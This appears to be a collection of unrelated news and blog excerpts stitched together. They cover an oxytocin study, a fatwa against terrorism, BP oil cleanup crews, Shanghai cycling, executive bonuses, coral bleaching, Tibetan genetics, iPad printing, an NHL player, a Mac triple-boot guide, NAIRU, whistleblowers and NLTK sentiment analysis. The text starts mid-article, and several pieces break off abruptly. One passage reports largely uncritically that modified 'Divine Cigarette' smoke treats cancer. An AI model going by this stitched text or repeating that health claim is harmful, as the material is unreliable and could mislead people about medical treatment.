And , the girls who had contact with their mothers experienced elevated levels of oxytocin that lasted more than an hour after the stressful event .
The girls with no maternal contact experienced no increase in oxytocin .
While this study focused on mothers and daughters and therefore ca n’t be generalized to all family relationships , attachment between all family members ca n’t be discarded , especially when dealing with stress and trauma .
Attachment is a powerful subject , and one that is frequently discussed in our programs on trauma treatment .
Please leave a comment below and tell us what you think of the “ Mom intervention ” .

Dr Tahir ul - Qadri : 600 - page ruling
An influential Muslim scholar has issued a global ruling against terrorism and suicide bombing .
Dr Tahir ul - Qadri , from Pakistan , says his 600 - page judgement , known as a fatwa , completely dismantles al - Qaeda 's violent ideology .
The scholar describes al - Qaeda as an " old evil with a new name " that has not been sufficiently challenged .
The scholar 's movement is growing in the UK and has attracted the interest of policymakers and security chiefs .
In his religious ruling , delivered in London , Dr Qadri says that Islam forbids the massacre of innocent citizens and suicide bombings .
Although many scholars have made similar rulings in the past , Dr Qadri argued that his massive document goes much further by omitting " ifs and buts " added by other thinkers .
He said that it set out a point - by - point theological rebuttal of every argument used by al - Qaeda inspired recruiters .
The populist scholar developed his document last year as a response to the increase in bombings across Pakistan by militants .
' Heroes of hellfire '
The basic text has been extended to 600 pages to cover global issues , in an attempt to get its theological arguments taken up by Muslims in Western nations .
It will be promoted in the UK by Dr Qadri 's organisation , Minhaj ul - Quran International .
Dr Qadri spoke for more than hour to an audience of Muslims , clergy , MPs , police officers and other security officials .
" They [ terrorists ] can't claim that their suicide bombings are martyrdom operations and that they become the heroes of the Muslim Umma [ global brotherhood ] .
No , they become heroes of hellfire , and they are leading towards hellfire , " he said .
" There is no place for any martyrdom and their act is never , ever to be considered jihad . "
Acts of vengeance
The document is not the first to condemn terrorism and suicide bombing to be launched in the UK .
MINHAJ UL - QURAN
Islamic organisation from the Sufi tradition Active in 70 countries 5,000 members in UK
BBC Religion : Sufism explained Scholars from across the UK came together in the wake of the 7 July London attacks to denounce the bombers and urge communities to root out extremists .
But some scholarly rulings in the Middle East have argued that the conflict between Israel and the Palestinians is an exceptional situation where " martyrdom " attacks can be justified .
Dr Qadri said he rejected that view saying there were no situations under which acts of vengeance , such as attacks on market places or commuter trains , could ever be considered a justifiable act of war .
Although Dr Qadri has many followers in Pakistan , Minhaj ul - Quran International remained largely unknown in the UK until relatively recently .
It now has 10 mosques in cities with significant Muslim communities and says it is targeting younger generations it believes have been let down by traditional leaders .
The organisation is attracting the attention of policymakers and security chiefs who are continuing to look for allies in the fight against extremists .
The Department for Communities , which runs most of the government 's Preventing Violent Extremism strategy , has tried building bridges with a variety of liberal - minded groups , but often found that they have limited actual influence at the grassroots .

Fishermen of the Gulf States signed up to join the BP cleanup crew with their vessels , called the “ Vessels of Opportunity ” , after they lost their livelihood on April 22 .
This was their way to protect their ecosystem and find some source of income for their families , or so they thought .
Every morning they attend a briefing where they receive specific instructions for the remainder of the day .
Mark and Frank Kruse , brothers of the deceased captain Allen Kruse who committed suicide last week , stated “ Each day there was a different meeting with a different plan and Allen told us that this was madness . ”
Captain Kruse had told his brothers that they were instructed by BP managers to take out their boats and ride around close to shore so people could see them , then bring the boats back in .
Gulf fishermen are afraid to speak on camera but quietly confirm that they receive no protective gear and no respirators from BP even when they asked on several occasions .
The crews do not even get rubber gloves to protect their hands from potential skin allergies caused by the toxic mix of oil and dispersants .
They are all quiet out of fear of losing their jobs with BP which is now their only source of income .
They further confirmed that BP managers have repeatedly assured the cleanup crew that the air around and above the oil spill is safe to breathe .
Many crew members have reported illnesses such as nausea and respiratory problems , but doctors refrain from pointing out that such are caused by benzene and Corexit fumes , both known to be carcinogens when inhaled .
The cleanup effort is also a very slow process and only about 25 % of the current oil spill has either been burned or scooped out of the water , leaving more than 100 million gallons of oil drifting in the Gulf of Mexico and around the Eastern seaboard on its way north .
• Oil clean up is not so clean
It is not known whether the EPA has any control over the cleanup effort and whether warnings have been issued to BP to control the process in an environmentally safe fashion to protect both the crew as well as contain any cross contamination .
Several disposal trucks have already been seen leaking oil on busy roads and in parking lots and are subject to heavy rainfall .

In Shanghai , there are a lot of bikes .. a LOT of bikes .
With the high costs of car ownership , heavy pollution and traffic congestion , bikes are still a great alternative and you can quickly get around the city .
However , bikes are still generally considered to be the poor - man ’s machine – and as the economy grows and people ’s income increases , people are ditching their bikes for scooters , e-bikes and automobiles .
Problem is , bikes and pedestrians are the bottom of the food chain .
The only traffic enforcement you will see in Shanghai is to keep pedestrians out of the way of the automobiles .
The single goal is to keep cars moving as quickly as possible .
In Shanghai , cars always have the right - of - way .
Even if you have a “ walk ” signal – which indicates the “ right - of - way ” in North America – do n’t be fooled into thinking you have the right - of - way .
You need to wait for a gap in cars – even though they are passing through a red light – and you need to run to avoid slowing down automobile traffic .
The consequence of not doing so ?
At best , you will be brushed by a fast - moving automobile .
Fortunately , the traffic engineers have recognized this potential conflict between cyclists and automobiles , so they have provided many barrier - protected cycle tracks for bicycles and scooters , automobile - free streets as well as bike - free streets .

Shanghai also has designated bike parking lots everywhere .
There are lines painted on the sidewalk to indicate where bikes should be parked .

The following photo is from 6 AM on a Saturday morning – so the bike parking lot is expectedly empty :

But do n’t kid yourself – these bike parking lots are completely full on weekdays and most are full on weekends too .
This photo is from Friday afternoon :

But perhaps more interesting is the idea of having a “ handicap ” bike parking spot .
I have never seen anything like this in North America , and I ’m not sure if they have these in Europe .
But why not ?
Why should n’t a handicapped person ride a bike or a scooter ?
Unless they are in a wheelchair , many handicapped people I know could still ride a bike or a scooter .
It ’s nice to see the Shanghai government has provided a space for these people as well as everyone else to park their bikes .

What really fascinates me about the cycling in China is what the future holds .
The economy in China is growing at a phenomenal rate .
People ’s wealth will continue to increase and the temptation to use automobiles will threaten these cities just like they did in Europe and North America when car became king in the decades following World War II .
Big cities in China will hit a threshold where they may start to see bikes as an effective and pragmatic tool rather than simply using them because that ’s all they can afford .
Or if the government is n’t careful , China could simply turn into the United States .
They could rip out the existing cycle paths to make more room for automobiles and then the great Chinese cities will be nothing more than big American cities .
At least bikes in China have some historical significance as being a pragmatic tool for transporting people and goods .
But will this be enough to secure the future for bicycles in China ?

Some execs get ' pity ' bonus
NEW YORK ( CNNMoney.com ) --
Maybe you missed your earnings target last year or your stock was crushed .
But if you 're a corporate executive , that might not necessarily prohibit you from earning a generous bonus .
Following an unprecedented period of economic turmoil , a number of corporate boards appear to have taken pity on executives last year .
In some instances , they handed over millions of dollars in so - called discretionary bonuses to managers .
At United Technologies ( UTX , Fortune 500 ) , which manufactures everything from elevators to helicopters , its top six executives collected a combined $ 4.5 million in bonuses last year , even though the company failed to reach its goal of matching its 2008 profit performance .
Board members at the company defended the move however , maintaining that earnings at peers fell much further , while the company managed to achieve other important milestones , including not cutting its dividend .
" The Committee believes it achieved the appropriate balance in rewarding strong relative performance despite an absolute decline in earnings in 2009 , " the company wrote in its annual proxy statement .
Other companies deemed that top - performing execs were simply not compensated enough last year .
Starbucks ( SBUX , Fortune 500 ) CEO Howard Schultz , for example , was awarded a $ 1 million bonus for helping to turn around the Seattle - based coffee retailer , bringing his total 2009 pay to $ 12.1 million .
Board members originally ordered Schultz to forgo his salary and did not allow him to participate in the executive bonus program .
Typically , executive bonuses are judged based on a variety of factors , such as the company 's stock performance , year - end earnings or other fundamentals .
But after the economy unraveled much faster than anyone ever anticipated , targets that once seemed attainable for many executives quickly moved out of reach .
As a result , some boards looked elsewhere for indications that 2009 was indeed a good year .
" This was a year in which many [ compensation ] committees found themselves in that position because of the economy , " said Rose Marie Orens , senior partner at the compensation advisory firm Compensation Advisory Partners .
At computer - maker Hewlett - Packard ( HPQ , Fortune 500 ) , for example , the best gauge was the company 's performance against its peers .
After deeming that CEO Mark Hurd was " not fully rewarded " by the $ 14.6 million bonus he received under the firm 's annual incentive compensation program , the firm added a $ 1.2 million bonus for doing better than rivals like Dell .
Securing official numbers on discretionary bonuses is difficult as companies are just starting to disclose executive compensation in their annual proxies .
But given the intense focus on and backlash against big pay on Wall Street , chances are that discretionary bonuses may be the exception rather than the rule .
The last thing a firm 's compensation committee wants to do is defend why it granted a bonus to a seemingly underperforming executive , said Holly Gregory , a partner in the corporate governance practice at the law firm Weil Gotshal .
" There is a certain risk aversion on behalf of compensation committees , " she said .
" They know the spotlight is on them . "
So far , shareholder activists , which have blasted board members in the past for lapses in judgment on compensation , have yet to make much fuss about discretionary bonuses .
But proxy advisory firm RiskMetrics recommended that shareholders withhold votes from five directors at medical imaging firm Hologic ( HOLX ) , ahead of its annual shareholder meeting last week after the company gave its transitioning CEO multiple retention bonuses , despite a relatively poor stock performance .
Despite the attack , all five directors managed to receive majority support from shareholders , according to a subsequent company filing .
Paying bonuses during tough economic times could potentially become palatable , said Paul Hodgson , senior research associate at the corporate governance research firm The Corporate Library .
To do that though , he said boards would have to be just as willing to cut bonuses when executives miss lofty targets during a robust economic environment .
" That never happens , " he said .
" I 'm prepared to accept the logic on that point if there was a flip side to it . "
Evidence shows the rise in ocean temperatures due to global warming endangers coral species native to Brazil 's coastal regions .
Twenty out of 40 species of corals found in Brazil have not been observed anywhere else on the planet .
At the headquarters of the Living Coral Conservation Project , based in Arraial da Ajuda , Bahia , the phenomenon known as bleaching was observed even in corals raised in research tanks .
The occurrence was first detected in March , after two months of warmer than usual water temperatures .
The incident was the biggest ever seen in Brazil , and coral whitening could be observed in an area spanning 2.500 km , from Rio Grande do Norte to Ilha Grande , in Rio de Janeiro .
Bleaching occurs because some species of coral depend on micro-seaweed to survive .
Seaweed acts as the coral 's second layer .
Like all plants , they rely on photosynthesis to transform sunlight into energy .
Any leftover energy is then transferred to the coral in exchange for shelter .
When water temperature rises above normal levels , however , algae begin producing hydrogen peroxide , a substance toxic to coral .
In order to protect itself , the coral repels the algae , exposing its own white skeleton underneath .
“ Depending on the intensity and duration of the phenomenon , the coral might die , as we have observed in the Indian and Caribbean oceans ” , says biologist Clóvis Barreira e Castro .
“ In these regions , certain coral reefs were practically decimated after this phenomenon was observed ” .
Most Tibetans are genetically adapted to life on the " roof of the world , " according to a new study .
The Tibetan Plateau ( map ) rises more than 13,000 feet ( 4,000 meters ) above sea level .
At such heights , most people are susceptible to hypoxia , in which too little oxygen reaches body tissues , potentially leading to fatal lung or brain inflammation .
To survive the high life , many Tibetans carry unique versions of two genes associated with low blood hemoglobin levels , the researchers found .
Since hemoglobin is the oxygen - carrying component of red blood cells , the find might seem " really counterintuitive , " said study leader Tatum Simonson at the University of Utah 's Eccles Institute of Human Genetics in Salt Lake City .
" Usually , if you or I or any nonadapted person went to high altitude , we would increase our hemoglobin levels to compensate for the low amount of oxygen . "
But high hemoglobin levels have been linked to complications such as hypertension and chronic mountain sickness , Simonson said .
These negative effects could have led to a genetic mutation among Tibetans that " prevented them from making as much " hemoglobin , she noted .
Tibetan Genes Keys to Treating Height Sickness ?
Previous research had found that Tibetans compensate for low oxygen levels by taking more breaths per minute than people living at sea level .
In addition , Tibetans ' blood vessels are wider , making them more efficient at delivering oxygen to body tissues .
Simonson and her colleagues searched for the genetic basis of high - altitude adaptations by collecting blood samples from villagers in Tibet living at 14,720 feet ( 4,486 meters ) above sea level .
( Get insider 's tips on life in Lhasa , capital of China 's Tibet Autonomous Region . )
The team then looked for patterns of genetic variation in the Tibetans ' DNA and compared their findings to existing data on gene variation in lowland Chinese and Japanese populations , which are closely related to Tibetans .
Several variants of genes associated with high - altitude living , such as those that process oxygen , were found in Tibetans but not in their low - living neighbors .
That includes the two genes that are strongly associated with low hemoglobin production .
Future research is aimed at teasing out more details about what exactly the altered genes do , which could help scientists find ways to " prevent people from getting sick " at high altitudes , Simonson said .

One of the few , yet more common complaints about the iPad is its lack of a printing solution .
As it stands now , Apple ’s current and official printing solution involves emailing pertinent documents back to your Mac and printing them from there .
Umm , no thanks .
But things may soon be changing .
A MacRumors reader reportedly emailed Jobs asking why there was no printing on the iPad .
In typical Jobs fashion , he tersely responded , “ It will come . ”
With email exchanges involving Jobs becoming ever more frequent , there are also a few more spoof emails floating around .
Last we checked , no one had checked the veracity of the above exchange , so take it with a small grain of salt .
Then again , if you ’re going to fake an email from Jobs , lying about iPad printing seems to be a pretty lame choice .
With Apple aggressively trying to push the iPad version of iWork as a worthy suite of software for creating documents and spreadsheets on the go , it only makes sense that printing should be a workable part of that equation as well .
If users have to constantly send documents back to their Mac in order to print , then what ’s the point ?
Back in late January , AppleInsider reported that Apple was working on some as of yet un-announded iPad features to make the device more appealing for enterprise users , including new printing options .
Sources who talked to Apple ’s business unit also say the company is working on some additional features that have n’t been publicly announced yet .
These include support for direct network printing from iPad apps , as well as support for accessing shared files from a local file server .
Make it happen , captain .

There was a time when Alex Burrows was about as far from the NHL as any hockey player could be .
After he went undrafted following his final year with the Shawinigan Cataractes of the Quebec Major Junior Hockey League , he toiled for three ECHL seasons in such hockey hotbeds as South Carolina and Louisiana .
Burrows was n't exactly living the dream , playing hockey in locales that are more interested in college football than low - level hockey .
" Obviously coming out of junior , my dream was to play in the NHL , " Burrows said .
" But just playing a professional sport as a 21 - year - old , I thought it was pretty cool even though I was making 400 bucks a week .
" Burrows said frustration was starting to build , so he set a deadline for getting a call - up to the AHL .
If he could n't get out of the ECHL , he was prepared to quit the game , go to college , and start a career in something else .
" It 's tough to come out .
There 're not a lot of scouts down there , " Burrows said .
" So I told myself then , if at Christmas I 'd still be there , I 'd have to try to go back to school and try to do something that was a career .
Good thing one week later I got called up ( to the AHL Manitoba Moose ) and never looked back .
" Five years later , he 's the leading goal - scorer on the top line of the Vancouver Canucks Every sport has its tales of players carving out careers after failing to hear the names called on draft day , but Burrows has transformed himself from a fourth - line role player into a 35 - goal scorer playing alongside Henrik and Daniel Sedin .
After 22 goals in his first 206 NHL games , Burrows has 63 in his last two seasons playing primarily with the Sedin twins , easily two of the most talented offensive players in the League .
Playing with the Sedins can be akin to being a third wheel on a date .
The Sedins have played together since they were pre-teens , developing so much chemistry that it can make it tough for a newcomer to adjust to what they like to do .
But to hear Henrik tell it , it was as if Burrows was their long - lost twin Canadian brother .
" It was quick , really quick , " he said of the instant chemistry he and Daniel had with Burrows .
" Some guys it 's really quick .
You know right away this is going to work , and he 's one of them for sure .
" When asked how the 29 - year - old compares to some other players that have played with the Sedins , Henrik heaped some high praise on Burrows , a player who could 've been a dentist or office manager today if he did n't catch his break six years ago .
Would you believe Henrik Sedin prefers Alex Burrows over Markus Naslund " We 've never had one like Alex , " Henrik said of the others who played on his line with Daniel .
" Markus was a good fit … but Burrows has been the best so far .
" What makes Burrows the perfect fit is he knows his role .
He drives to the net , makes himself available and does whatever he can to get the puck onto the sticks of his playmaking linemates .
He also has a knack for using his quickness and relative lack of size ( he 's 6 - foot - 1 , 188 pounds ) for getting open .
" I think he brings a pretty good forecheck , " Daniel said .
" He gets the pucks back for us .
He reads guys so well so he gets open .
He 's a small player .
That 's the No. 1 thing . "
" I do n't think he does anything special -- he 's a good hockey player , " Henrik said .
" He 's got good hockey sense .
He makes the easy play all the time .
He 's easy to read .
He knows where we want to have the puck and we know where he 's going to be .
That 's why it works so good I think . " " Those guys are spectacular players , " Burrows said .
" You saw again this year .
With Hank winning the Art Ross , and Danny , if we would not have gotten injured , probably would be right behind them .
"
It 's not as if Burrows has n't played with a scoring champion before .
While with the Columbia Inferno in 2003 - 04 , he was on a line with Tim Smith , who led the ECHL with 95 points in 69 games .
" Now I 'm playing with two of the top players in the world and it makes my job a lot easier , but back then I used to play with Tim Smith , " Burrows said .
" He used to lead the league in scoring .
He was one of my good friends .
He leads the league in Asia now , so that 's kind of funny how it goes .
Obviously the guys did n't get all the breaks I did , but I worked hard and I got here and I 'm pretty happy .
" But maybe Burrows is the one who deserves most of the credit for the Art Ross Trophy .
After all , it 's not as if Henrik Sedin and Tim Smith won any scoring titles before they started playing with Burrows .
" People have said so , " Burrows said with a laugh , " but I like to give the credit to them . "

Apple has streamlined the process of dual booting Windows on your Mac , but when it comes to Linux , Boot Camp is n't so friendly .
Here 's how to triple - boot your Mac with OS X , Windows 7 , and the shiny new Ubuntu 10.04 .
Advertisement
If you 're a Mac user , you may have already used Apple 's Boot Camp to get Windows on your system for those must - have programs .
With a fast new Ubuntu out , however , you might want to give it a try — but installing Linux is n't exactly easy on Macs , since they do n't recognize it by default .
Advertisement
Also complicating things ?
Linux and Windows ' boot loaders will attempt to take over one another .
Usually , this is a good thing , because Linux 's multi-system loader makes the experience more seamless for PC users — but on a Mac , this really just makes things more difficult ( no one wants to go through two menus to choose their OS ) .
As such , installing Linux needs to be done with certain settings applied , or you 'll be left with a jumbled mess .
Here 's a step - by - step guide to making your triple booting experience as user - friendly as possible .
Note that I will go through the steps to installing both Windows 7 and Ubuntu 10.04 , but if you already have Windows installed , that should n't be an issue — just skip the Windows installation step and move on to installing Ubuntu , which is the more complicated ( and important ) part anyways .

Install the rEFIt Boot Menu for Macs
Before we do anything else , we 're going to install a new boot menu for your Mac that will make your life during and after installation much easier .
rEFIt will show up every time you start up your computer , asking you which OS you want to use .
By default , it will boot into OS X after 20 seconds of inactivity ( so you do n't have to be there every time to choose ) .
It 's super customizable , though , so you can change your default OS if you want to , as well as tweak other settings to fit into your workflow as best as possible .
Advertisement
Head on over to rEFIt 's SourceForge page and download the DMG for the most recent version of the installer ( 0.14 at the time of this writing ) .
Open it up and launch the installer package , and go through the installation process ( which is pretty self - explanatory ; it 'll do all the work for you ) .
Afterwards , restart your computer to see if it works !
If everything goes as planned , your screen should look something like the screen at the top of this article ( though if not , you might have to restart twice to get it to show up ) .
Obviously , it 'll only have one or two icons instead of three — the others come next !
Advertisement
At this point , the rEFIt boot menu is fully functional , though if you want to customize it , you 'll have to edit your configuration file .
More information on this is available in rEFIt 's documentation ; I wo n't get deep into it now , but it 's not very difficult to tweak things like the default OS , or which tools show up along the bottom .
You just need to " uncomment " the given option by removing the # before the relevant command in the text file .
You can also customize the icons by swapping your own .icns with the default ones in rEFIt 's folder on your hard drive .
You can do that now , or move on to partitioning your disk .
Partition Your Hard Drive with Disk Utility
We wo n't be using Boot Camp to partition our disk , mostly because we do n't need to .
Since we 're triple - booting , it 's easier to see it all at once , rather than let some tool do it for us ( if you 've already installed Windows using Boot Camp , though , that 's fine — just ignore the Windows parts of this step ) .
Open up Disk Utility , click on your main drive ( the very top option in the sidebar ) and head to the " Partition " tab .
Advertisement
We 're going to make three new partitions ; one for Windows , one for Linux , and one for our Linux swap space , the space Linux uses if it runs out of memory .
To do this , just click on your Macintosh HD partition .
If you have multiple partitions already , click on the one from which you want to take back some space .
Next , hit the plus sign enough times so that you have four total partitions .
Click on your first new partition ( the one under " Macintosh HD " ) and on the right side of the window , type " WINDOWS " in the name box .
Format this Windows partition to MS - DOS , then make the size whatever you want .
The sizes do n't particularly matter , as long as your OS will fit on the partition , and you have enough extra space for whatever you want .
I partitioned 50 GB to each OS — probably overkill , but hey , I 've got a big drive .
Do the same for a Linux and Linux swap partition , formatting each to MS - DOS ( the format is n't super necessary , but at least for the Windows installation it does make the process easier ) .
Hit the apply button and let Disk Utility do its thing — it'll seem like it stops responding , but just leave it be for a minute , and you should be all set .
Once it 's done , move on to the next step .

Installing Windows 7
Insert your Windows 7 install disc and restart your computer , unless you 've already installed it , in which case , move on to installing Ubuntu ) .
As your computer starts up , listen for the familiar Mac startup sound , then immediately press and hold the Option ( or " Alt " ) key on your keyboard , until you see a drive icon with the word rEFIt under it .
You 'll need to give your system a second to check the CD drives ( assuming you 're running Snow Leopard , which is a little slow at doing so ) , but your Windows CD should pop up on the right .
Click on the CD icon , then hit Enter to boot into the installation .
You might also get a screen that says " Press any key to boot from CD .
. . " , in which case you 'll have to do what it says , or else just restart your computer .
Advertisement
Go ahead and navigate through the first few steps of the installation .
When you 're asked what type of install you want to perform , choose " custom install " , so you can pick and format the partition .
You 'll want to choose the one named WINDOWS ( obviously ) , though you 'll have to format it by clicking " drive options " and then " Format " .
It should reformat that partition to NTFS for you , after which you can hit the next button .
It 'll take a little while to install , and it'll restart a few times during that process — whenever it does , select the Windows partition on boot ( which should show up in rEFIt now , so you wo n't need to hold option down again ) .
Advertisement
When it 's done and you finally get to the Windows desktop , you can go ahead and install the Boot Camp drivers from your Leopard or Snow Leopard install DVD .
Since your eject key wo n't work yet , you 'll have to eject your Windows disc manually by going into Windows Explorer , clicking on your optical drive , then choosing the " Eject " button in the toolbar .
After inserting your Snow Leopard DVD , it should start automatically with the option to run setup.exe .
Pick that , then let the installation run .
Once you 're done , head back over to OS X , so you can burn and install Ubuntu .

Installing Ubuntu 10.04
If you do n't already have an Ubuntu installation CD , you 'll need to head back into your Mac system ( or Windows , if you want to give it a go ) and grab the ISO from Ubuntu 's website .
Make sure you get the right one for your machine , whether it be a desktop / laptop or a netbook , and 32 - or 64 - bit .
Once it 's downloaded , burn it with your burning program of choice ( I 'm quite partial to the flexible , open - source Burn myself , though you could also do it with Disk Utility ) .
Once it 's burned , keep it in the drive and restart your computer , once again holding option at the startup sound and clicking on the CD that shows up in your boot menu .
It will say it 's a Windows disc , but do n't worry — it 's the right one .
OS X is just a little confused when it comes to the world outside itself .

It 'll take a few minutes for the CD to boot , but you should eventually be presented with the option to try Ubuntu or install it on your computer .
Choose install , then go through the first few steps of the process , picking your language , time zone , and keyboard type ( USA probably works fine , but I usually pick USA - Macintosh because , you know , that 's what I have ) .
When you 're presented with the partition window , choose the bottom option to " specify partitions manually " — this is where the fancy footwork comes in .

Double click on your Linux partition 's entry .
If you 've been following this how - to to the letter , it should be / dev/sda4 .
You 'll be presented with a window in which you manually set the partition 's characteristics .
I chose to use the partition as Ext4 , although you can pick something else if you want —
Ext4 seems to be the new standard , so I 'd recommend it if you do n't know the difference between them all .
Check the box to format the partition and make the mount point " / " .
Hit OK and double click on your 1 GB partition at the end of the drive , set it to be used as a swap area , and then hit OK .
At this point , your window should look something like this :
Advertisement
Go through the rest of the installation until the last window , where it 's ready to install and asks you to double - check everything .
Hit the advanced button .
Make sure " install boot loader " is checked , and change the device for boot loader installation to the same partition on which you installed Linux ( in the above case , / dev/ sda4 ) .
Hit next and let 'er rip .
When it 's done it should restart your computer and your rEFIt boot menu should contain an option for all three operating systems .
If you can successfully boot into both partitions , congratulations !
You 've got a working triple - boot system .

Unfortunately , installing drivers in Ubuntu is not nearly as easy as installing them in Windows .
Actually , it 's probably the hardest part of this entire process .
It 's model - specific to each Mac , so I can't detail it all here , but the Ubuntu Community Documentation is usually quite good at compiling a how - to for each model , so head on over to the page for your model of iMac or MacBook to get everything up and running .
Follow the instructions as closely as you can , do n't be afraid to ask for help on the Ubuntu forums , and God be with you .
There are , of course , a few different ways to set this up ( see our guide to dual booting Windows 7 and Ubuntu on a PC for a few possible modifications , such as creating a swap file within Ubuntu instead of on a separate partition ) , but in general this is a straightforward , user - friendly way to get it all working .
You wo n't have to deal with a bunch of different boot menus , and you wo n't have to deal with OS X's limitations in recognizing Linux drives at boot ( though you still wo n't be able to see your Linux partition from the Mac desktop ) .
If you 've got experience with this , though , we 'd love to hear your preferred method of triple booting your Mac — tell us about it in the comments !
Many in the medical field might raise an eyebrow upon hearing that cigarette smoke can be good for one ’s health , given the numerous findings relating tobacco use to an increase in the risk of cancer .
Yet an Indonesian nanochemistry scientist is treating thousands of cancer patients in her clinic with modified cigarettes .
Seventy - one - year - old Greta Zahar , who holds a PhD in nanochemistry from the Bandung - based University of Padjadjaran , has been researching and developing specially treated cigarettes and cigarette filters , which she dubs the Divine Cigarette and Divine Filter , for more than a decade .
She developed a detoxification process called balur ( smear ) treatment , which uses smoke from Divine Cigarettes as a conduit to capture and extract poisonous metal such as mercury from the body – a process she believes can be beneficial in treating cancer and several other diseases .

Somewhere out there lies a trigger point for Federal Reserve rate hikes .
While that policy tightening may not come for many months or even years , economists still believe the key variable is the interplay between employment and inflation .
That interplay , most economists believe , has changed in the wake of the worst recession in generations .
Structural changes in the economy mean higher rates of unemployment will be the new normal .
As a result , inflation could start to well up from levels of joblessness that until recently had been benign for price pressures .
At the heart of the issue is what economists call NAIRU , or Non-Accelerating Inflation Rate of Unemployment .
It ’s essentially the lowest level of unemployment that , if breached , will lead to rising inflationary pressure .
NAIRU is tough to pin down , but even so , the concept has currency with many economists and Fed policy makers .
Central bankers generally deal with the issue in a roundabout way , by talking about how much excess capacity the economy has .
They also offer assessments of the output gap , or the difference between where the economy ’s potential growth is and where activity gains actually are .
The more negative this gap is , the less inflation should arise .
In this way NAIRU bleeds back into the debate over what the Federal Reserve will do with monetary policy .
Economists are increasingly gravitating to the view NAIRU , roughly speaking , is higher than it once was .
That means the Fed has less wiggle room : higher levels of unemployment may already be able to generate the sort of inflation central bankers need to counter with tighter monetary policy .
The Fed itself does n’t make available a NAIRU forecast .
The Congressional Budget Office , as part of making its own economic projections , does and puts the measure at 5 % through 2020 — about where it ’s been for the last couple of decades .
Deutsche Bank economists believe NAIRU is on the rise .
In a research note the bank said they believe the measure was at 5.6 % in 2009 and could hit 6 % this year .
They tie the rise to the long - term nature of unemployment seen in the wake of the recession .
Also , some industries , like the auto sectors , have cut back capacity for years to come .
Extended unemployment insurance benefits also play a role , the economists said .
UBS economist Drew Matus concurs that NAIRU is “ drifting a little higher ” relative to the past , pegging it at around 6 % to 6.5 % .
Economists ’ evolving view on NAIRU has at best a minimal role to play in the monetary policy game right now .
May ’s 9.7 % unemployment rate is very high and a long way from anything that will drive the Fed to end its near - zero % interest rate policy .
Indeed , this gap is a fundamental reason why so many forecasters believe the Fed can make it into 2011 without acting .
That said , NAIRU is n’t a problem - free concept .
Calculating it requires an analyst to make assumptions about what the economy ’s potential growth rate is .
In a real sense , NAIRU , like other rule - based policy tools , are rooted in things that are n’t actually measurable , at least in something close to real time .
“ You might as well ask what is the tooth fairy ’s favorite color or what sound does a rainbow make , ” said Ian Shepherdson , of High Frequency Economics .
The NAIRU concept asserts the economy “ is permanently highly unstable ” and is always a step away from a highly unstable inflation environment , the economist said , adding “ there has been no evidence to support this idea in the past 30 years . ”
It 's worth paying attention to medicine , because when it goes wrong , people suffer and die .
But how do we know when things are going wrong ?
This week the BMA produced a report on whistleblowers .
Of the 384 doctors who responded to its survey ( that was a dismal response rate of 12 % , we should be clear ) , 40 % said they would be too frightened of repercussions to report concerns about patient safety .
Of those who had spoken out , one in 10 were told this could have a negative impact on their careers .
But are they being melodramatic ?
And what if life for whistleblowers was better ?
A study in the New England Journal of Medicine this week follows up 26 whistleblowers from the pharmaceutical industry .
In the US , speaking out is well remunerated and if you help the government bring a successful case , you keep a chunk of the settlement .
The money is big .
In September , for example , Pfizer paid $ 2.3 bn ( £ 1.6 bn ) to settle allegations – backed by evidence from six whistleblowers — that it illegally marketed a painkiller called Bextra which has since been withdrawn .
The 26 people in the NEJM study received an average of $ 3 m for their trouble , with sums ranging from $ 100,000 to $ 42 m .
They say money was n't the issue – and to be fair most were already on high wages – citing motives such as personal integrity , a responsibility to protect public health , and a fear of being implicated themselves .
Nearly all had tried to fix things internally first by talking to their boss , or filing an internal complaint .
But did the money help sweeten things ?
Almost all were placed under enormous pressure by their companies .
Thirteen reported stress - related health problems including shingles , psoriasis , autoimmune disorders , panic attacks , asthma , insomnia , migraines , and more .
Six reported divorces , severe marital strain , or other family conflicts .
The majority were clear , furthermore , that the money was no compensation for the years of conflict , and the damage to their careers .
Only two still worked in the industry .
One said he " should have taken the bribe " , another said if she'd " stayed and took stock options " she " would 've been worth a lot more " .
For at least eight , it was devastating .
" I just was n't able to get a job , " said one .
" It went longer and longer .
Then I lost [ my home ] .
I had my cars repossessed .
I just went – financially I went under . "
These stories come , remember , from a country that makes whistleblowers into millionaires .
Here , we expect healthcare workers to speak out when they see people being harmed , but when they do , we offer no such assistance .
In fact , quite the opposite .
Dr Stephen Bolsin was the whistleblower on the Bristol heart scandal , where children were dying unnecessarily .
It ruined his career , leaving him unemployable in Britain .
He is now working in Australia .
The examples are endless .
The General Medical Council insists that doctors speak out , and ultimately blow the whistle , or be struck off .
These are admirable ideals which everyone would like to think they could uphold , but we have also chosen to configure our society in a way that punishes people for doing the right thing .
If we leave that unchanged , then we may have to accept our collective responsibility for the inevitable consequences : unnecessary deaths , and unnecessary suffering .
Sentiment analysis is becoming a popular area of research and social media analysis , especially around user reviews and tweets .
It is a special case of text mining generally focused on identifying opinion polarity , and while it ’s often not very accurate , it can still be useful .
For simplicity ( and because the training data is easily accessible ) I ’ll focus on 2 possible sentiment classifications : positive and negative .
NLTK Naive Bayes Classification
NLTK comes with all the pieces you need to get started on sentiment analysis : a movie reviews corpus with reviews categorized into pos and neg categories , and a number of trainable classifiers .
We ’ll start with a simple NaiveBayesClassifier as a baseline , using boolean word feature extraction .
Bag of Words Feature Extraction
All of the NLTK classifiers work with featstructs , which can be simple dictionaries mapping a feature name to a feature value .
For text , we ’ll use a simplified bag of words model where every word is feature name with a value of True .
Here ’s the feature extraction method :
def word_feats ( words ) : return dict ( [ ( word , True ) for word in words ] )
Training Set vs Test Set and Accuracy
The movie reviews corpus has 1000 positive files and 1000 negative files .
We ’ll use 3 / 4 of them as the training set , and the rest as the test set .
This gives us 1500 training instances and 500 test instances .
The classifier training method expects to be given a list of tokens in the form of [ ( feats , label ) ] where feats is a feature dictionary and label is the classification label .
In our case , feats will be of the form {word : True} and label will be one of ‘ pos ’ or ‘ neg ’ .
For accuracy evaluation , we can use nltk.classify.util.accuracy with the test set as the gold standard .
Training and Testing the Naive Bayes Classifier
Here ’s the complete python code for training and testing a Naive Bayes Classifier on the movie review corpus .
